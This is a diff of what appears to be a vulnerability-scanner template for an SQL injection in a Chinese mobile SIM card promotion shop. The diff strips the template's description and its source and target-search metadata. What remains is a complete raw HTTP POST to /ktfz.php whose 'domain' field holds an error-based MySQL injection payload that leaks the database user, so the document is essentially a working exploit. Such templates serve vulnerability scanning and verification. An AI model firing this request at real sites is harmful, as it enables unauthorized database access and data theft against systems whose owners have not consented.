@@ -3,12 +3,8 @@ info:
   name: 手机卡号推广商城ssk接口 SQL注入漏洞2
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gcg42pn73lcaym05'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gcg42pn73lcaym05
-    fofa: body="zgdx.php"
 http:
 - raw:
   - 'POST /ktfz.php?upid=1 HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Connection: close
-
-
 
 
     domain='' AND (SELECT 1809 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- c&pwd=111&submit=%E6%B7%BB%E5%8A%A0&user=111
